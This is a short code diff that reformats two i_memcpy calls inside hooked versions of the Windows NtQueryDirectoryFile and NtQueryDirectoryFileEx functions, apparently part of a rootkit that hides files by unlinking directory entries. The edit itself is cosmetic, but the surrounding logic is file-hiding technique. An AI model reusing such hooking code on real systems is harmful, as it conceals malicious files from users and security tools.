@@ -248,8 +248,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 				{
 					if (nextEntryOffset)
 					{
-						i_memcpy
-						(
+						i_memcpy(
 							current,
 							(LPBYTE)current + nextEntryOffset,
 							(ULONG)(length - ((ULONGLONG)current - (ULONGLONG)fileInformation) - nextEntryOffset)
@@ -311,8 +310,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 				{
 					if (nextEntryOffset)
 					{
-						i_memcpy
-						(
+						i_memcpy(
 							current,
 							(LPBYTE)current + nextEntryOffset,
 							(ULONG)(length - ((ULONGLONG)current - (ULONGLONG)fileInformation) - nextEntryOffset)
